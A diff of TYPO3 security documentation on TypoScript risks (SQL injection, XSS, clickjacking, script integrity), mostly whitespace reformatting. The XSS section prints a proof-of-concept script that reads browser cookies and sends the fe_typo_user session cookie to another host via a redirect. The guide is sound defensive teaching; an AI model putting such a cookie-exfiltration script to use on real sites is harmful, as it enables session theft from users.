@@ -1,18 +1,20 @@
-.. include:: /Includes.rst.txt
-.. index:: pair: Security guidelines; TypoScript
-.. _security-typoscript:
+:navigation-title: TypoScript
 
-==========
-TypoScript
-==========
+..  include:: /Includes.rst.txt
+..  index:: pair: Security guidelines; TypoScript
+..  _security-typoscript:
+
+============================
+Security risks in TypoScript
+============================
 
 
-.. index::
-   SQL injection
-   pair: TypoScript; SQL injection
-   pair: Security guidelines; SQL injection
+..  index::
+    SQL injection
+    pair: TypoScript; SQL injection
+    pair: Security guidelines; SQL injection
 
-.. _security-typoscript-sql:
+..  _security-typoscript-sql:
 
 SQL injection
 =============
@@ -35,20 +37,20 @@ the SQL query with values from the GET/POST request.
 
 The following code snippet gives an example:
 
-.. code-block:: typoscript
+..  code-block:: typoscript
 
-   page = PAGE
-   page.10 = CONTENT
-   page.10 {
-     table = tt_content
-     select {
-       pidInList = 123
-       where = deleted=0 AND uid=###CONTENTID###
-       markers {
-           CONTENTID.data = GP:fooid
-       }
-     }
-   }
+    page = PAGE
+    page.10 = CONTENT
+    page.10 {
+      table = tt_content
+      select {
+        pidInList = 123
+        where = deleted=0 AND uid=###CONTENTID###
+        markers {
+            CONTENTID.data = GP:fooid
+        }
+      }
+    }
 
 Argument passed by the `GET` / `POST` request `fooid` wrapped as markers are properly
 escaped and quoted to prevent SQL injection problems.
@@ -60,12 +62,12 @@ As a rule, you cannot trust (and must not use) any data from a source
 you do not control without proper verification and validation (e.g.
 user input, other servers, etc.).
 
-.. index::
-   ! Cross-site scripting
-   XSS
-   pair: TypoScript; Cross-site scripting
+..  index::
+    ! Cross-site scripting
+    XSS
+    pair: TypoScript; Cross-site scripting
 
-.. _security-typoscript-xss:
+..  _security-typoscript-xss:
 
 Cross-site scripting (XSS)
 ==========================
@@ -73,42 +75,42 @@ Cross-site scripting (XSS)
 Similar applies for XSS placed in `TypoScript` code. The following code
 snippet gives an example:
 
-.. code-block:: typoscript
+..  code-block:: typoscript
 
-   page = PAGE
-   page.10 = COA
-   page.10 {
-     10 = TEXT
-     10.value (
-       <h1>XSS &#43; TypoScript - proof of concept</h1>
-       <p>Submitting (harmless) cookie data to google.com in a few seconds...</p>
-     )
-     20 = TEXT
-     20.value (
-       <script type="text/javascript">
-       document.write('<p>');
-       // read cookies
-       var i, key, data, cookies = document.cookie.split(";");
-       var loc = window.location;
-       for (i = 0; i < cookies.length; i++) {
-         // separate key and value
-         key = cookies[i].substr(0, cookies[i].indexOf("="));
-         data = cookies[i].substr(cookies[i].indexOf("=") + 1);
-         key = key.replace(/^\s+|\s+$/g,"");
-         // show key and value
-         document.write(unescape(key) + ': ' + unescape(data) + '<br />');
-         // submit cookie data to another host
-         if (key == 'fe_typo_user') {
-           setTimeout(function() {
-             loc = 'https://www.google.com/?q=' + loc.hostname ;
-             window.location = loc + ':' + unescape(key) + ':' + unescape(data);
-           }, 5000);
-         }
-       }
-       document.write('</p>');
-       </script>
-     )
-   }
+    page = PAGE
+    page.10 = COA
+    page.10 {
+      10 = TEXT
+      10.value (
+        <h1>XSS &#43; TypoScript - proof of concept</h1>
+        <p>Submitting (harmless) cookie data to google.com in a few seconds...</p>
+      )
+      20 = TEXT
+      20.value (
+        <script type="text/javascript">
+        document.write('<p>');
+        // read cookies
+        var i, key, data, cookies = document.cookie.split(";");
+        var loc = window.location;
+        for (i = 0; i < cookies.length; i++) {
+          // separate key and value
+          key = cookies[i].substr(0, cookies[i].indexOf("="));
+          data = cookies[i].substr(cookies[i].indexOf("=") + 1);
+          key = key.replace(/^\s+|\s+$/g,"");
+          // show key and value
+          document.write(unescape(key) + ': ' + unescape(data) + '<br />');
+          // submit cookie data to another host
+          if (key == 'fe_typo_user') {
+            setTimeout(function() {
+              loc = 'https://www.google.com/?q=' + loc.hostname ;
+              window.location = loc + ':' + unescape(key) + ':' + unescape(data);
+            }, 5000);
+          }
+        }
+        document.write('</p>');
+        </script>
+      )
+    }
 
 TYPO3 outputs the `JavaScript` code in :typoscript:`page.10.20.value` on the page.
 The script is executed on the client side (in the user's browser), reads
@@ -120,11 +122,11 @@ This code snippet is harmless of course but it shows how malicious
 code (e.g. JavaScript) can be placed in the HTML content of a page by
 using `TypoScript`.
 
-.. index::
-   ! Clickjacking
-   pair: TypoScript; Clickjacking
+..  index::
+    ! Clickjacking
+    pair: TypoScript; Clickjacking
 
-.. _security-typoscript-clickjacking:
+..  _security-typoscript-clickjacking:
 
 Clickjacking
 ============
@@ -140,13 +142,13 @@ this configuration.
 
 The following TypoScript adds the appropriate line to the HTTP header:
 
-.. code-block:: typoscript
+..  code-block:: typoscript
 
-   config.additionalHeaders = X-Frame-Options: SAMEORIGIN
+    config.additionalHeaders = X-Frame-Options: SAMEORIGIN
 
 
-.. index:: Security guidelines; External JavaScript
-.. _security-typoscript-integrity-js:
+..  index:: Security guidelines; External JavaScript
+..  _security-typoscript-integrity-js:
 
 Integrity of external JavaScript files
 ======================================
@@ -166,19 +168,19 @@ The TypoScript property can be used for the following :ref:`PAGE <t3tsref:page>`
 
 A typical example in TypoScript looks like:
 
-.. code-block:: typoscript
+..  code-block:: typoscript
 
-   page {
-     includeJS {
-       jQuery = https://code.jquery.com/jquery-1.11.3.min.js
-       jQuery.external = 1
-       jQuery.integrity = sha256-7LkWEzqTdpEfELxcZZlS6wAx5Ff13zZ83lYO2/ujj7g=
-     }
-   }
+    page {
+      includeJS {
+        jQuery = https://code.jquery.com/jquery-1.11.3.min.js
+        jQuery.external = 1
+        jQuery.integrity = sha256-7LkWEzqTdpEfELxcZZlS6wAx5Ff13zZ83lYO2/ujj7g=
+      }
+    }
 
 
-.. index:: Security guidelines; External JavaScript libraries
-.. _security-typoscript-risk-external-js:
+..  index:: Security guidelines; External JavaScript libraries
+..  _security-typoscript-risk-external-js:
 
 Risk of externally hosted JavaScript libraries
 ==============================================
